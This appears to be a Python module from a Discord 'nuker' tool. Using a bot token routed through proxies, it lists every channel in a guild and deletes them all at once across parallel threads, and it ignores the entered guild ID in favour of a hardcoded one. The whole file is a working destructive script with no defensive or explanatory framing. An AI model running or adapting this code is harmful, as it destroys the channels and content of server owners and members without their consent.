import functions.PyUtls as utils
import functions.discordRequests as discord
import json
import threading as thr

name = 'Delete all channels'
description = 'Deletes all channels in server'

threads = []


def execute(proxe, token):
    id = utils.binput('Guild ID: ')

    id = '970203723819282432'

    if discord.checkGuild(id, token, proxe) == 404:
        utils.warn('Bot is not in guild')
        return

    list_of_channels = discord.guildChannels(id, token, proxe)

    times_deleted = 0
    for i in list_of_channels:
        thread = thr.Thread(target=discord.deleteChannel, args=(
            i['id'], token, proxe))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
        times_deleted += 1
    utils.bprint(f"{times_deleted} channels deleted.")
